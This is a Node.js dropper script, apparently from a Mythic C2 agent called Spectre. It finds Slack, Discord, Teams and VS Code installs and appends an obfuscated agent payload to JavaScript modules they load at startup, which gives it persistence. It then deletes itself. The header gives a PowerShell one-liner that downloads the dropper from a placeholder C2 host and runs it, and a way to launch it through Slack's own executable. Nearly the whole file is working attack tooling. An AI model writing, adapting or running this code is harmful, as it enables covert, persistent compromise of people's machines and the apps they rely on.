/**
 * Spectre - Electron Dropper
 *
 * Standalone script that finds installed Electron apps on the system
 * and appends the Spectre payload to a startup-loaded JS module.
 *
 * Usage (from any shell on the target):
 *
 *   node drop.js                     -- auto-find first Electron app, inject
 *   node drop.js --app slack         -- inject into Slack specifically
 *   node drop.js --app discord       -- inject into Discord specifically
 *   node drop.js --target "C:\full\path\to\module.js"  -- inject into specific file
 *   node drop.js --list              -- just list discovered apps, don't inject
 *   node drop.js --restore "C:\...\module.js"          -- undo injection
 *
 * Or as a one-liner from PowerShell initial access:
 *
 *   powershell -c "iwr https://YOUR-C2/drop.js -o $env:tmp\d.js; node $env:tmp\d.js"
 *
 * Or without node installed, via the Electron app's own node:
 *
 *   "%localappdata%\slack\app-4.x.x\slack.exe" --no-sandbox --js-flags="--expose-gc" -e "require('.\\drop.js')"
 *
 * This script is meant to be used ONCE for initial access. After the
 * agent checks in, use the 'inject' command from Mythic to spread to
 * other Electron apps if needed.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');

// ============================================================
// Configuration
// ============================================================

// The Spectre payload will be stamped here by the builder.
// When building via Mythic, the builder replaces this placeholder
// with the actual assembled + obfuscated agent IIFE.
const PAYLOAD = '__SPECTRE_PAYLOAD_PLACEHOLDER__';

// Known Electron app layouts
const ELECTRON_APPS = {
    slack: {
        paths: [
            path.join(os.homedir(), 'AppData', 'Local', 'slack'),
        ],
        // Modules loaded on every Slack startup (in order of preference)
        modules: [
            // These are common across Slack versions - try each until one exists
            'resources/app.asar.unpacked/node_modules/@puja/websocket/index.js',
            'resources/app.asar.unpacked/node_modules/keytar/lib/keytar.js',
            'resources/app.asar.unpacked/node_modules/node-hid/index.js',
        ],
    },
    discord: {
        paths: [
            path.join(os.homedir(), 'AppData', 'Local', 'Discord'),
            path.join(os.homedir(), 'AppData', 'Local', 'DiscordPTB'),
            path.join(os.homedir(), 'AppData', 'Local', 'DiscordCanary'),
        ],
        modules: [
            'resources/app.asar.unpacked/node_modules/discord_utils/index.js',
            'resources/app.asar.unpacked/node_modules/erlpack/index.js',
            'resources/app.asar.unpacked/node_modules/discord_spellcheck/index.js',
        ],
    },
    teams: {
        paths: [
            path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Teams'),
            path.join(os.homedir(), 'AppData', 'Local', 'Packages', 'MSTeams_8wekyb3d8bbwe', 'LocalCache', 'Microsoft', 'MSTeams'),
        ],
        modules: [
            'resources/app.asar.unpacked/node_modules/slimcore/index.js',
            'resources/app.asar.unpacked/node_modules/@aspect/core/index.js',
            'resources/app.asar.unpacked/node_modules/electron-log/src/index.js',
        ],
    },
    vscode: {
        paths: [
            path.join(os.homedir(), 'AppData', 'Local', 'Programs', 'Microsoft VS Code'),
        ],
        modules: [
            'resources/app/node_modules/graceful-fs/graceful-fs.js',
            'resources/app/node_modules/yauzl/index.js',
            'resources/app/node_modules/original-fs/index.js',
        ],
    },
    // Generic: any Electron app the operator points us at
};

// ============================================================
// App Discovery
// ============================================================

/**
 * Find the actual versioned app directory.
 * Electron apps often install as app-1.2.3/, app-4.5.6/, etc.
 * We want the most recent version.
 */
function findAppRoot(basePath) {
    if (!fs.existsSync(basePath)) return null;

    // Check if resources/ exists directly (non-versioned layout)
    if (fs.existsSync(path.join(basePath, 'resources'))) {
        return basePath;
    }

    // Look for versioned directories
    try {
        const entries = fs.readdirSync(basePath)
            .filter(e => e.startsWith('app-'))
            .sort()
            .reverse(); // newest first

        for (const dir of entries) {
            const candidate = path.join(basePath, dir);
            if (fs.existsSync(path.join(candidate, 'resources'))) {
                return candidate;
            }
        }
    } catch (e) {
        // Permission denied, etc.
    }

    return null;
}

/**
 * Discover all Electron apps and their injectable modules.
 */
function discoverApps() {
    const results = [];

    for (const [appName, config] of Object.entries(ELECTRON_APPS)) {
        for (const basePath of config.paths) {
            const appRoot = findAppRoot(basePath);
            if (!appRoot) continue;

            const targets = [];
            for (const modulePath of config.modules) {
                const fullPath = path.join(appRoot, modulePath);
                if (fs.existsSync(fullPath)) {
                    const content = fs.readFileSync(fullPath, 'utf-8');
                    targets.push({
                        path: fullPath,
                        relative: modulePath,
                        size: fs.statSync(fullPath).size,
                        alreadyInjected: content.indexOf('__s_g') !== -1,
                    });
                }
            }

            if (targets.length > 0) {
                results.push({
                    name: appName,
                    root: appRoot,
                    targets: targets,
                });
            }
        }
    }

    return results;
}

// ============================================================
// Injection
// ============================================================

/**
 * Append the payload to a target JS module.
 */
function injectInto(targetPath, payload) {
    // Read existing content
    const original = fs.readFileSync(targetPath, 'utf-8');

    // Check for double injection
    if (original.indexOf('__s_g') !== -1) {
        console.log('[!] Already injected: ' + targetPath);
        return false;
    }

    // Backup original
    const backupPath = targetPath + '.bak';
    if (!fs.existsSync(backupPath)) {
        fs.writeFileSync(backupPath, original);
    }

    // Append payload
    fs.writeFileSync(targetPath, original + '\n' + payload);
    console.log('[+] Injected into: ' + targetPath);
    console.log('    Backup saved:  ' + backupPath);
    console.log('    Size: ' + original.length + ' -> ' + (original.length + payload.length + 1) + ' bytes');

    return true;
}

/**
 * Restore a file from its backup.
 */
function restore(targetPath) {
    const backupPath = targetPath + '.bak';
    if (!fs.existsSync(backupPath)) {
        console.log('[!] No backup found: ' + backupPath);
        return false;
    }

    fs.copyFileSync(backupPath, targetPath);
    fs.unlinkSync(backupPath);
    console.log('[+] Restored: ' + targetPath);
    return true;
}

// ============================================================
// CLI
// ============================================================

function main() {
    const args = process.argv.slice(2);

    // Parse simple flags
    let mode = 'auto';   // auto | list | inject | restore
    let appFilter = null;
    let targetFile = null;

    for (let i = 0; i < args.length; i++) {
        switch (args[i]) {
            case '--list':
            case '-l':
                mode = 'list';
                break;
            case '--app':
            case '-a':
                appFilter = args[++i];
                break;
            case '--target':
            case '-t':
                mode = 'inject';
                targetFile = args[++i];
                break;
            case '--restore':
            case '-r':
                mode = 'restore';
                targetFile = args[++i];
                break;
            case '--help':
            case '-h':
                console.log('Usage: node drop.js [--list] [--app name] [--target path] [--restore path]');
                process.exit(0);
        }
    }

    // Check payload
    if (PAYLOAD === '__SPECTRE_PAYLOAD_PLACEHOLDER__') {
        console.log('[!] This dropper has not been built through Mythic.');
        console.log('    The payload placeholder has not been replaced.');
        console.log('    Build a payload in the Mythic UI first, then use the output.');
        process.exit(1);
    }

    // Restore mode
    if (mode === 'restore') {
        if (!targetFile) {
            console.log('[!] --restore requires a file path');
            process.exit(1);
        }
        restore(targetFile);
        return;
    }

    // Discover apps
    console.log('[*] Scanning for Electron applications...\n');
    const apps = discoverApps();

    if (apps.length === 0) {
        console.log('[!] No injectable Electron apps found.');
        console.log('    Use --target to specify a JS file path manually.');
        process.exit(1);
    }

    // List mode
    if (mode === 'list') {
        for (const app of apps) {
            console.log('  ' + app.name.toUpperCase());
            console.log('    Root: ' + app.root);
            for (const t of app.targets) {
                const status = t.alreadyInjected ? ' [ALREADY INJECTED]' : '';
                console.log('    -> ' + t.relative + ' (' + t.size + ' bytes)' + status);
            }
            console.log('');
        }
        return;
    }

    // Inject mode - specific target file
    if (mode === 'inject' && targetFile) {
        if (!fs.existsSync(targetFile)) {
            console.log('[!] Target file not found: ' + targetFile);
            process.exit(1);
        }
        injectInto(targetFile, PAYLOAD);
        return;
    }

    // Auto mode - find best target and inject
    let targetApp;
    if (appFilter) {
        targetApp = apps.find(a => a.name === appFilter.toLowerCase());
        if (!targetApp) {
            console.log('[!] App "' + appFilter + '" not found. Available:');
            apps.forEach(a => console.log('    ' + a.name));
            process.exit(1);
        }
    } else {
        // Pick the first app with a non-injected target
        targetApp = apps.find(a => a.targets.some(t => !t.alreadyInjected));
        if (!targetApp) {
            console.log('[!] All discovered targets already injected.');
            process.exit(0);
        }
    }

    // Pick the first non-injected module
    const target = targetApp.targets.find(t => !t.alreadyInjected);
    if (!target) {
        console.log('[!] All modules in ' + targetApp.name + ' already injected.');
        process.exit(0);
    }

    console.log('[*] Target: ' + targetApp.name.toUpperCase());
    console.log('[*] Module: ' + target.relative);
    console.log('');

    if (injectInto(target.path, PAYLOAD)) {
        console.log('');
        console.log('[+] Done. Agent will activate next time ' + targetApp.name + ' starts.');
        console.log('[+] To undo: node drop.js --restore "' + target.path + '"');
    }

    // Self-cleanup: delete this dropper script
    try {
        const selfPath = process.argv[1];
        if (selfPath && fs.existsSync(selfPath)) {
            // Schedule deletion after this process exits
            const cmd = process.platform === 'win32'
                ? `cmd.exe /c "timeout /t 2 /nobreak >nul & del /f "${selfPath}""`
                : `sleep 2 && rm -f "${selfPath}"`;

            require('child_process').exec(cmd, { windowsHide: true });
        }
    } catch (e) {
        // Self-cleanup is best-effort
    }
}

main();
